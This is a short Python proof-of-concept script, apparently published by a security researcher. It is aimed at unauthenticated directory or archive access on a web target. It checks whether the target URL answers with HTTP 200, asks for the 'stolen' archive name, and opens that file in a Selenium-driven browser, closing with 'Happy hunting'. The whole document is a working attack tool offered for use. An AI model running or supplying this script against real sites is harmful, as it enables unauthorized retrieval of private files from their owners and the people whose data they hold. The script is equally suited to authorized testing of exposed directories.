#!/usr/bin/python
# Author: nu11secur1ty 2022
from selenium import webdriver
import time
import os
from colorama import init, Fore, Back, Style
init(convert=True)
import requests

print("Give the CORRECT target URL\n")
target=input()
print("Test if you can access the directory\n")
time.sleep(3)

print(Fore.GREEN +"Please wait...\n")
print(Style.RESET_ALL)
time.sleep(5)

status = requests.get(target)
print(Fore.BLUE+"ATTENTION! The status of the code for accessing the directory is:",status)
print(Style.RESET_ALL)

if status.status_code == 200:
    print(Fore.RED +"The Access status of the directory is lowlily protected...")
    print(Style.RESET_ALL)
else:
    print(Fore.RED +"The Access status of the directory is strongly protected...\n")
    print(Style.RESET_ALL)
    
stolen_archive=input("Give the stolen name of the archive...\n")
driver = driver = webdriver.Firefox()
driver.get(target+stolen_archive)

print(Fore.RED +"Happy hunting with nu11secur1ty =)")
print(Style.RESET_ALL)
